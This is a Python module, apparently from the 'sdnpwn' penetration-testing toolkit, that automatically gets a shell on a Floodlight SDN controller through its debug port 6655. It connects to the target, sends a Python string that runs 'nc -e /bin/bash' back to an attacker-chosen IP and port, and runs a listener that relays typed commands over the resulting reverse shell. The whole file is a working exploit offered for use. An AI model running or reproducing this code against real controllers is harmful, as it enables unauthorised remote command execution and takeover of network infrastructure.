
import signal
import socket
from threading import Thread
import modules.sdnpwn_common as sdnpwn
from time import sleep

threads = []
socks = []
stopListening = False

def signal_handler(signal, frame):
  #Handle Ctrl+C here
  print("")
  sdnpwn.message("Stopping...Try Ctrl+C once more", sdnpwn.NORMAL)
  try:
    stopListening = True
    for s in socks:
      s.close()
  except:
    pass
  exit(0)
  
def info():
  return "Automatically gets a shell using Floodlight's debug port (6655)"
  
def usage():
  
  sdnpwn.addUsage(["--target", "-t"], "Target", True)
  sdnpwn.addUsage(["--listen", "-l"], "Listening socket (like 127.0.0.1:1234)", True)
  sdnpwn.addUsage(["--no-local", "-r"], "Do not start a local shell listener. Use if using nc, metasploit, etc to get shell", True)
  
  return sdnpwn.getUsage()

def getSocket(ip, port, timeout=2):
  try:
    comm_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    comm_sock.settimeout(timeout)
    comm_sock.connect((ip, int(port)))
    return comm_sock
  except Exception as e:
    #print(e)
    return None

def listenForShell(listeningPort):
  serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  serversocket.bind(('0.0.0.0', int(listeningPort)))
  serversocket.listen(1)
  (clientsocket, address) = serversocket.accept()
  sdnpwn.printSuccess("Got connection from " + str(address))
  cmdThread = Thread(target=sendCommands, args=(clientsocket,))
  cmdThread.start()
  threads.append(cmdThread)
  socks.append(serversocket)
  socks.append(clientsocket)
  
  while stopListening == False:
    data = clientsocket.recv(1024).decode()
    if(data):
      print(data, end='')
    else:
      break
  clientsocket.close()

def sendCommands(sock):
  while stopListening == False:
    cmd = input()
    sock.send(cmd.encode() + b'\x0a')
  
def run(params):
  
  signal.signal(signal.SIGINT, signal_handler) #Assign the signal handler
   
  target = sdnpwn.getArg(["--target", "-t"], params)
  listening = sdnpwn.getArg(["--listen", "-l"], params)
  noSpawnLocal = sdnpwn.checkArg(["--no-local", "-r"], params)
  
  if(sdnpwn.checkArg(["--listen", "-l"], params)):
    listeningIP = listening.split(":")[0]
    listeningPort = listening.split(":")[1]
  else:
    sdnpwn.printError("Missing listener options.")
    print(usage())
    return    
  
  floodlightDebugPort = 6655
  
  if(noSpawnLocal == False):
    sdnpwn.printNormal("Setting up shell handler...")
    listener = Thread(target=listenForShell, args=(listeningPort,))
    listener.start()
    threads.append(listener)
  
  sdnpwn.printNormal("Attempting connection to debug server...")
  sock = getSocket(target, floodlightDebugPort, 5)
  if(sock == None):
    sdnpwn.printError("Could not connect...quiting.")
    exit(0)
    
  sdnpwn.printNormal("Getting shell...")
  badString = "import subprocess; subprocess.call(['nc','-e', '/bin/bash', '" + listeningIP + "', '" + listeningPort + "\r'])"
  sock.send(badString.encode())
  
  socks.append(sock)
  
  while stopListening == False:
    pass